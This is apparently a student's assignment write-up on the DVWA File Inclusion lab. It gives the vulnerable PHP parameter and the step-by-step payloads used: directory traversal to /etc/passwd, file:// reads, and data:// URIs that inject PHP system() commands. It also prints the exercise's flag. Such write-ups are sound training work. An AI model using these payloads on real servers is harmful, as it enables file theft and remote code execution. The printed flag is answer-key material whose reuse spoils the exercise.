= Assignment: DVWA File Inclusion <assignment-4>

== Overview and Definitions

This assignment is about DVWA File Inclusion, which is about exploiting poor input validation of the file inclusion. I actually have personal experience with this vulnerability. When I was a teenager, in about year 2000, I had a website hosted on my personal domain, running on a rented shell account. The website was a simple PHP page that used navigation where URI parameters, like `?page=home` were used to include different content to the page, making it seemingly dynamic. I think the page was made of HTTP table back then, and iframe's were used to include the content. The attacker managed to convert the website into a proxy for some video streaming or sharing. Admins noticed this and locked my account until I fixed the vulnerability.

The key source I used for this assignment was a book _Kali Linux 2018: Assuring Security by Penetration Testing - Fourth Edition_ by Shiva Parasram et. al. (Packt Publishing, 2018). The Chapter _"Web Application Testing"_ has a section _"Directory-traversal and file-inclusion"_.

== Target Setup and Relevant Code

The website is currently at:

```
/var/www/html/dvwa/vulnerability/fi/
```

This means that we can access other files using relative paths, like:

```
../../../../../../etc/passwd
```

The PHP code that handles the file inclusion is as follows:

```php
<?php
$file = $_GET[ 'page' ];
?> 
```

== Observations

We simply place them to the URI like `...?page=<filepath>`. The assignment states that: _"The random flag (answer) you need to discover using File Inclusion vulnerability, is hidden inside a PHP file that has a random name and is located inside hackable/flags directory."_. Thus, based on what I've learned in the previous exercise, the file is likely to be something like `hackable/flags/flag_18021.php`.

```
../../../../../../app/hackable/flags/flag_18021.php
```

However, it is trickier to find a file that I do not know. I could simply loop over all numbers from 0 to 99999, but that would be inefficient. I found a Medium post, #link("https://chanuka1.medium.com/dvwa-file-inclusion-vulnerability-low-medium-high-security-levels-7e46e1ae8375")[DVWA: File Inclusion Vulnerability — Low, Medium & High Security Levels], where this kind of pattern is also suggested to work:

```
http://193.167.189.112:2788/vulnerabilities/fi/?page=file:///etc/passwd
```

It does, but it does not solve my problem of finding the file. However, it did lead my to another idea. Instead of file URI scheme, there actually exists a #link("https://en.wikipedia.org/wiki/Data_URI_scheme")[data URI scheme], which allows me to inject code into the URI. Thus, I can use the following URI to run a command:

```
http://193.167.189.112:2788/vulnerabilities/fi/?page=data://text/plain,<?php system('ls'); ?> 
```

== Assignment Solution

Now had I the missing pieces to the puzzle. I used the following prompts to the Firefox's address bar to find the file:

```
...?page=data://text/plain,<?php system('ls /app/hackable/flags'); ?>
...?page=file:///app/hackable/flags/45495.php
```
And now, I could see the `Your flag: <flag>` text on top of the page. For reference, the full flag value is:

```
ed79ad1f545283a020c388be6ca1565024cb61adfe126f1143ee971589b3e941
```

I rate this vulnerability as *CRITICAL*, since it allows an attacker to run arbitrary code on the server.
